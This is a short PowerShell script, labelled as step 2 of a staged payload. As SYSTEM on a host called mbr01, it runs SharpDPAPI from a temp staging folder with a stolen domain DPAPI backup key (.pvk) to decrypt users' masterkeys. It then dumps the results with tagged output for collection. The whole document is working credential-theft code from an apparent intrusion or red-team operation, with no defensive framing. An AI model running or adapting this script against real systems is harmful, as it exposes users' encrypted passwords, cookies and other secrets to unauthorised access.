# 3.5G step 2 payload: SharpDPAPI masterkeys /pvk as SYSTEM on mbr01
$ErrorActionPreference = 'Continue'
$sdp = 'C:\Windows\Temp\cadre-tools\SharpDPAPI.exe'
$pvk = 'C:\Windows\Temp\cadre-tools\cadre-backup.pvk'
$o = 'C:\Windows\Temp\sharpdpapi-out.txt'

if (Test-Path $sdp) {
    if (Test-Path $pvk) {
        Write-Output "PVK_PRESENT $((Get-Item $pvk).Length)"
        Remove-Item $o -ErrorAction SilentlyContinue
        & $sdp masterkeys /pvk:$pvk > $o 2>&1
        Start-Sleep -Seconds 2
        Write-Output "OUT_SIZE $((Get-Item $o -ErrorAction SilentlyContinue).Length)"
        Get-Content $o -ErrorAction SilentlyContinue | Select-Object -First 45 | ForEach-Object { Write-Output "SDP|$_" }
    } else { Write-Output 'PVK_MISSING' }
} else { Write-Output 'SHARPDPAPI_MISSING' }
Write-Output '3.5G_STEP2_DONE'
